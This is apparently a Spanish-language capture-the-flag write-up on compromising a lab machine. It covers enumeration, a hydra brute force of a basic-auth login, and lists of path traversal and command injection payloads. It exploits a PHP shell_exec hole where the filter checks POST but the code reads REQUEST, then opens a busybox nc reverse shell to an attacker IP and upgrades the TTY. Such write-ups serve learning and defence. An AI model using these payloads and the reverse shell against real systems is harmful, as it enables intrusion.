
Añadimos el dominio gattaca.nyx en el /etc/hosts y hacemos un escaneo nmap:

![[Pasted image 20260823161146.png]]

Puerto 80 HTTP abierto. 

Hacemos un whatweb para ver tecnologias:

![[Pasted image 20260823161224.png]]

Y entramos a la web:

![[Pasted image 20260823161242.png]]

AL ver el codigo fuente no se ve mucha cosa interesante, asi que haremos un fuzzing de archivos o directorios:


**FFUF:**
![[Pasted image 20260823161802.png]]


**DIRSEARCH:**

![[Pasted image 20260823161952.png]]

Hemos encontrado unos directorios curiosos:

1. cards
2. images
3. fonts


Lo demas n o tiene nada de info excepto **cards** que tiene un inicio de sesion http basico:
![[Pasted image 20260824145522.png]]

Asi que intentamos un ataque de fuerza bruta a este inciio de sesión. En este tipo de inciio de sesion las credenciales se envian en base64 y no en json:




```
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt gattaca.nyx http-get /cards.php -s 80
```

![[Pasted image 20260824145912.png]]

Y encontramos el user y contraseña:

```
admin:admin12345
```

Y nos encontramos con esto:

![[Pasted image 20260824145956.png]]

Si ponemos esos archivos no ocurre nada en el buscados, pero si intentamos poner otro archivo coo **/etc/passwd** nos salta el WAF:

![[Pasted image 20260824150833.png]]


Se analiza la request y se envia algo asi:

![[Pasted image 20260824182050.png]]

Lo primero que se me vino a la mente es un **Path Traversal**, ya que veo un campo que se llama filename y lo que seme ocurre es que le servidor obtenga ese campo y lo envie a una funcion que lea o cambie de directorio para leer x archivo. 

Asi que pruebo varios payloads:

1. Classico=../../../../../../../../etc/passwd
2. Doble = ....//....//....//....//etc/passwd
3. URL encoding = %2e%2e%2f%252e%252e%252f
4. Doble URL encoding %252e%252e%252f%252e%252e%252f
.... Ver la Cheat Sheet de URL encoding

Pero hay un filtro que bloquea todo

Pero luego pensé, y si realment eel codigo no cambia de directorio sino que ejecuta una funcion como exec o system de php. Aqui ya no seria un **Path Traversal** sino un Command Injection. Asi que probamos payloads de Command Injection:

1. ;ls;
2. &ls
3. &&ls
4. ||ls
5. `ls`
Pero claro tambien habia que tener en cuenta que y si la funcion que se ejecuta es algo por el estilo:

```php
exec(cat /ruta/ruta/${filename})
```

claro ahi ya no sirve la mayoria de payloads, solo el de punto y coma (,) pero igualmente el WAF los bloqueaba. 

Asi que pensé en cambiar de metodo HTTP de POST a GET, y funcionó. INtentando escapar del comando con punto y coma pero enviandolo como get, obtenia un COmmand INjection y podia ejecutar comandos en el sistema:

![[Pasted image 20260824182805.png]]



Para ver la vulnerabilidad en detalle he hecho un cat del archivo cards.php para entender el codigo:

![[Pasted image 20260824183350.png]]

Codigo php :

```php
<?php
        $folder = "/var/www/gattaca/cards";
        $files = scandir($folder);
        $files = array_diff($files, array('.', '..'));
        foreach ($files as $files) {
        echo "<li>$files</li>";
        }
        if (isset($_REQUEST['filename'])) {
        if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
	      $output = shell_exec("cat " . $_REQUEST['filename']);
	      echo "$output";
        } else {
                echo "Malicious Request Denied!";
        }
        }
?>

```

EL problema es que REQUEST puede ser tanto para POST,  como para GET (explicar la vulnerabilidad bien).

Asi que nos ponemos en escucha para obtener una reverse shell:

Y enviamos el payload siguiente ya que sabemos que es un Debian
(URL ENCODED):

```
busybox+nc+10.10.10.20+4444+-e+bash
```


![[Pasted image 20260824195518.png]]

APLicamos la tty:

```zsh
script /dev/null -c bash
# (Presionar CTRL+Z para suspender la shell)
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash
stty rows 29 columns 111
```


AHora intentaremos subir privilegios ya que somos www-data. 



